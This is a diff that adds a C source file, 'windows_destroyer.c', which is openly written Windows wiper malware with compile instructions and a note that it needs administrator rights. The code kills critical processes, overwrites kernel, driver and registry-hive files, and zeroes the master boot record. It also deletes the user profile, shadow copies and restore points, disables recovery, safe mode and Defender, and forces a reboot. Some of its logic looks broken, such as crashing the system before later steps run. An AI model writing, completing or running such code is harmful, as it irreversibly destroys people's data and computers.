@@ -1,0 +1,193 @@
+// windows_destroyer.c
+// Compile with: gcc -o destroyer.exe windows_destroyer.c -luser32 -lkernel32 -ladvapi32
+// Run as Administrator required for full effect.
+
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+// Recursively delete all files and folders in a directory
+void wipe_directory(const char* path) {
+    char searchPath[MAX_PATH];
+    char fullPath[MAX_PATH];
+    WIN32_FIND_DATA findData;
+    HANDLE hFind;
+
+    snprintf(searchPath, MAX_PATH, "%s\\*", path);
+    hFind = FindFirstFile(searchPath, &findData);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    do {
+        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
+            continue;
+
+        snprintf(fullPath, MAX_PATH, "%s\\%s", path, findData.cFileName);
+
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            // Recursively delete subdirectory
+            wipe_directory(fullPath);
+            RemoveDirectory(fullPath);
+        } else {
+            // Delete file
+            SetFileAttributes(fullPath, FILE_ATTRIBUTE_NORMAL);
+            DeleteFile(fullPath);
+        }
+    } while (FindNextFile(hFind, &findData));
+
+    FindClose(hFind);
+    RemoveDirectory(path);
+}
+
+// Overwrite critical system files with garbage
+void corrupt_system_files() {
+    const char* targets[] = {
+        "C:\\Windows\\System32\\ntoskrnl.exe",
+        "C:\\Windows\\System32\\kernel32.dll",
+        "C:\\Windows\\System32\\hal.dll",
+        "C:\\Windows\\System32\\winload.exe",
+        "C:\\Windows\\System32\\bootmgr",
+        "C:\\Windows\\System32\\config\\SYSTEM",
+        "C:\\Windows\\System32\\config\\SOFTWARE",
+        "C:\\Windows\\System32\\config\\SAM",
+        "C:\\Windows\\System32\\config\\SECURITY",
+        "C:\\Windows\\System32\\drivers\\ntfs.sys",
+        "C:\\Windows\\System32\\drivers\\disk.sys",
+        NULL
+    };
+
+    HANDLE hFile;
+    DWORD written;
+    char garbage[4096];
+    memset(garbage, 0xAA, sizeof(garbage));
+
+    for (int i = 0; targets[i] != NULL; i++) {
+        hFile = CreateFile(targets[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            // Overwrite entire file with garbage
+            for (int j = 0; j < 1024; j++) { // 4 MB total
+                WriteFile(hFile, garbage, sizeof(garbage), &written, NULL);
+            }
+            CloseHandle(hFile);
+        }
+    }
+}
+
+// Overwrite Master Boot Record
+void wipe_mbr() {
+    HANDLE hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDisk != INVALID_HANDLE_VALUE) {
+        char mbr[512];
+        memset(mbr, 0x00, 512);
+        DWORD written;
+        WriteFile(hDisk, mbr, 512, &written, NULL);
+        CloseHandle(hDisk);
+    }
+}
+
+// Disable Windows Recovery and boot repair
+void disable_recovery() {
+    system("bcdedit /set {default} recoveryenabled no");
+    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
+    system("reagentc /disable");
+    system("sfc /disable");
+}
+
+// Kill critical processes
+void kill_processes() {
+    const char* procs[] = {
+        "explorer.exe", "winlogon.exe", "csrss.exe", "services.exe", "lsass.exe",
+        "svchost.exe", "spoolsv.exe", "dwm.exe", "taskmgr.exe", "cmd.exe", "powershell.exe",
+        NULL
+    };
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = { sizeof(pe) };
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            for (int i = 0; procs[i] != NULL; i++) {
+                if (_stricmp(pe.szExeFile, procs[i]) == 0) {
+                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if (hProc) {
+                        TerminateProcess(hProc, 1);
+                        CloseHandle(hProc);
+                    }
+                }
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+}
+
+// Delete shadow copies and restore points
+void delete_shadows() {
+    system("vssadmin delete shadows /all /quiet");
+    system("wmic shadowcopy delete");
+    system("wmic restorepoint delete");
+}
+
+// Modify registry to prevent OS from starting
+void corrupt_registry() {
+    HKEY hKey;
+    // Set boot to crash
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager", 0, KEY_SET_VALUE, &hKey);
+    RegSetValueEx(hKey, "PendingFileRenameOperations", 0, REG_MULTI_SZ, (BYTE*)"\0", 2);
+    RegCloseKey(hKey);
+
+    // Disable safe mode
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SafeBoot", 0, KEY_SET_VALUE, &hKey);
+    RegDeleteKey(hKey, "Minimal");
+    RegDeleteKey(hKey, "Network");
+    RegCloseKey(hKey);
+
+    // Disable Windows Update and Defender
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", 0, KEY_SET_VALUE, &hKey);
+    DWORD val = 1;
+    RegSetValueEx(hKey, "NoAutoUpdate", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+    RegCloseKey(hKey);
+
+    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey);
+    DWORD disable = 1;
+    RegSetValueEx(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+    RegCloseKey(hKey);
+}
+
+int main() {
+    // Elevate privilege if not admin
+    // (simplified: rely on user running as admin)
+
+    // Step 1: Kill all critical processes to destabilize
+    kill_processes();
+
+    // Step 2: Corrupt system files
+    corrupt_system_files();
+
+    // Step 3: Wipe MBR to prevent boot
+    wipe_mbr();
+
+    // Step 4: Delete all user data (Documents, Desktop, etc.)
+    char userPath[MAX_PATH];
+    if (SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userPath) == S_OK) {
+        wipe_directory(userPath);
+    }
+    // Also wipe C:\Windows\System32\config (registry hives already corrupted)
+    // and other common folders
+    wipe_directory("C:\\Windows\\System32\\config");
+    wipe_directory("C:\\Windows\\System32\\drivers");
+
+    // Step 5: Delete shadow copies
+    delete_shadows();
+
+    // Step 6: Disable recovery
+    disable_recovery();
+
+    // Step 7: Corrupt registry
+    corrupt_registry();
+
+    // Step 8: Overwrite boot sector again
+    wipe_mbr();
+
+    // Step 9: Force immediate crash
+    system("shutdown /r /t 0 /f");
+
+    return 0;
+}
